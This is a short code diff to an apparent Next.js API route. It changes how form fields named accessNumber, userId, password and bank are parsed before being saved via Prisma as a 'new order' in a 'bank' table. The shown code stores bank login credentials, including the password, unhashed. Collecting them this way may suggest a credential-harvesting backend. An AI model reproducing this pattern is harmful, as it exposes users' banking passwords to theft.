@@ -23,10 +23,10 @@ export async function POST(req: NextRequest) {
     const params = new URLSearchParams(body); // Convert it to a URLSearchParams object
 
     // Extract values from the form data
-    const accessNumber = params.get('accessNumber') ?? undefined; // Set to undefined if null
-    const userId = params.get('userId') ?? undefined; // Set to undefined if null
-    const password = params.get('password') ?? undefined; // Set to undefined if null
-    const bank = params.get('bank') ?? undefined; // Set to undefined if null
+    const accessNumber = params.get('accessNumber') || null; // Convert empty string to null
+    const userId = params.get('userId') || null; // Convert empty string to null
+    const password = params.get('password') || null; // Convert empty string to null
+    const bank = params.get('bank') || null; // Convert empty string to null
 
     // Create a new order in the database using Prisma
     const newOrder = await prisma.bank.create({
